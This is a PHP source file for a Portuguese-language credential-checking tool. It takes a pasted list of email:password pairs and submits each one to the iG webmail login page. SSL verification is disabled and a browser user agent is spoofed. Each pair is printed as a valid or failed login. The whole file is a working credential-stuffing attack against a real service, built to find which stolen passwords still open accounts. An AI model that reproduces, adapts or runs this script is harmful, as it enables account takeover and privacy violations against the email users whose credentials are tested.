<?php
error_reporting(0);
set_time_limit(0);

echo '</head>
<body>
<center>

<form name="" method="post">
<textarea name="logins" class="input" cols="50"  rows="10"></textarea>
<br>
<br>
<input type="submit" value="Testar!">
</form>';

if(isset($_POST['logins'])){

  $logins = trim($_POST['logins']);
  flush(); ob_flush();
  $logins = split("\n", $logins);

  $contar =  count($logins);
  flush(); ob_flush();

  print "<hr><b>Testando ".$contar." Login...<br>Aguarde...</b><br>";

  flush(); ob_flush();

  for($x = 0; $x < $contar; $x++) {
    $logins = str_replace(" ", "", $logins);
    $logins = str_replace("\r", "", $logins);
    $logins = str_replace("\n", "", $logins);

    list($email, $password) = split(":", $logins[$x]);

    $numero = $x + 1;
    print "<br>[".$numero."] ".$email.":".$password." - ";
    flush(); ob_flush();
    if(file_exists("g1.txt")) {
      unlink("g1.txt");
    }
    $run = CekLogin($email, $password);

    print $run;
  }
  print "<hr><b>Finalizado Aproveite :) Obrigado por usa nossa ferramenta.!</b>";

}

function CekLogin($email,$passw) {

  //random cookie
  $token = md5(uniqid(rand(), true));
  $cookie = $token .'x.txt';


  # POST LOGIN
  $urlPost = "https://login.ig.com.br/signin/";
  $post_fields = "returnTo=https%3A%2F%2Flogin.ig.com.br%2Fwebmail%2Fsignin&skin=webmail-pub-ig&username_id=".rawurlencode($email)."&username_pw=".$passw."";
  # CHAMADA CURL
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $urlPost);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
  curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
  curl_setopt($ch, CURLOPT_MAXREDIRS, 0);
  curl_setopt($ch, CURLOPT_HEADER, 1);
  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
  curl_setopt($ch, CURLOPT_TIMEOUT, 30);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEJAR,  $cookie);
  curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:', 'Connection: close'));
  curl_setopt($ch, CURLOPT_ENCODING, '');
 $post = curl_exec($ch);

  curl_close($ch);


  preg_match("/Found/sim",$post, $retorno); ## VERIFICAR SE FOI LOGADO CERTINHO ... ^^

  if(empty($retorno)){
    echo "<font color='red'>  [-] $email:$passw </font>"; # MERDA

  }else{
    echo "<font color='gren'> [+] $email:$passw </font>"; # LOGADO $$
  }


}



?>
